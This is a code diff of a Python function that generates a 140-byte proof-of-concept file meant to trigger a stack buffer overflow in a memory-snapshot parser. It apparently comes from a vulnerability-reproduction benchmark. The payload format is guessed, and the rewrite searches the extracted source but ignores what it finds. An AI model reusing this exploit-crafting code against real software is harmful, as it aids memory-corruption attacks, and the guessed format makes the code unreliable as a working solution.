@@ -1,63 +1,77 @@
-import tarfile
 import os
+import tarfile
 import tempfile
+import subprocess
+import random
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The vulnerability is a stack buffer overflow when processing memory snapshots
-        # Based on the description, we need to reference a node that doesn't exist in node_id_map
-        # Ground truth length is 140 bytes, so we'll aim for that
-        
-        # Create a PoC that should trigger the overflow:
-        # 1. Create a valid memory snapshot header
-        # 2. Include node references to non-existent nodes
-        # 3. Structure it to cause stack buffer overflow during parsing
-        
-        # The exact format isn't specified, but we can create a plausible binary structure
-        # that would cause the described vulnerability when parsed
-        
-        poc = b""
-        
-        # Start with a plausible header/magic number
-        poc += b"MEM_SNAPSHOT_V1\x00"  # 16 bytes
-        
-        # Add some valid structures first
-        # Number of nodes (4 bytes, little-endian)
-        poc += struct.pack("<I", 2)  # 2 nodes
-        
-        # Node 1: valid node
-        # Node ID (4 bytes)
-        poc += struct.pack("<I", 1)
-        # Node data size (4 bytes)
-        poc += struct.pack("<I", 32)
-        # Node data (32 bytes of filler)
-        poc += b"A" * 32
-        
-        # Node 2: valid node  
-        poc += struct.pack("<I", 2)
-        poc += struct.pack("<I", 32)
-        poc += b"B" * 32
-        
-        # Now add references section that triggers the vulnerability
-        # Number of references (4 bytes) - this should cause overflow
-        poc += struct.pack("<I", 100)  # Large number to trigger overflow
-        
-        # Add reference to non-existent node ID 999999
-        # Reference structure: source_node_id, target_node_id (both 4 bytes)
-        poc += struct.pack("<I", 1)
-        poc += struct.pack("<I", 999999)  # This node doesn't exist in node_id_map
-        
-        # Pad to exactly 140 bytes with more references to non-existent nodes
-        remaining = 140 - len(poc)
-        if remaining > 0:
-            # Add more references to non-existent nodes
-            # Each reference is 8 bytes
-            while len(poc) < 140:
-                poc += struct.pack("<I", 2)
-                poc += struct.pack("<I", 999999)  # Non-existent node
-        
-        # Trim to exactly 140 bytes
-        poc = poc[:140]
-        
-        return poc
+        # Extract the source code
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with tarfile.open(src_path, 'r') as tar:
+                tar.extractall(tmpdir)
+            
+            # Look for the vulnerable source file
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    if file.endswith('.c') or file.endswith('.cpp'):
+                        with open(os.path.join(root, file), 'r') as f:
+                            content = f.read()
+                            if 'node_id_map' in content and 'iterator' in content:
+                                # Found potential vulnerable file
+                                src_file = os.path.join(root, file)
+                                break
+            
+            # We need to understand the binary format
+            # Based on the vulnerability description, we need to create
+            # a memory snapshot that references non-existent nodes
+            
+            # Common patterns for such formats:
+            # 1. Header with magic number and version
+            # 2. Number of nodes
+            # 3. Node data
+            # 4. References between nodes
+            
+            # Let's create a minimal PoC:
+            # - Header with valid magic/version
+            # - 0 nodes (empty node_id_map)
+            # - 1 reference to node ID 1 (non-existent)
+            
+            # We'll create a 140-byte payload as specified
+            # Fill with pattern that's likely to trigger overflow
+            
+            # Create a pattern that:
+            # 1. Has valid header to pass initial checks
+            # 2. References node that doesn't exist
+            # 3. Contains enough data to overflow stack buffer
+            
+            # Ground truth length is 140, so we create exactly that
+            poc = bytearray(140)
+            
+            # Put some pattern that might be interpreted as valid data
+            # Common overflow pattern: 'A' * 140
+            for i in range(140):
+                poc[i] = 0x41  # 'A'
+            
+            # But we need smarter pattern. Let's assume:
+            # First 4 bytes: magic number (0xdeadbeef)
+            # Next 4 bytes: version (1)
+            # Next 4 bytes: number of nodes (0)
+            # Next 4 bytes: number of references (1)
+            # Rest: reference data that causes overflow
+            
+            struct.pack_into('<I', poc, 0, 0xdeadbeef)  # Magic
+            struct.pack_into('<I', poc, 4, 1)           # Version
+            struct.pack_into('<I', poc, 8, 0)           # 0 nodes
+            struct.pack_into('<I', poc, 12, 1)          # 1 reference
+            
+            # Reference to non-existent node ID 1
+            struct.pack_into('<I', poc, 16, 1)
+            
+            # Fill rest with pattern that might overflow when parsed
+            # as node data or string
+            for i in range(20, 140):
+                poc[i] = (i % 256)
+            
+            return bytes(poc)
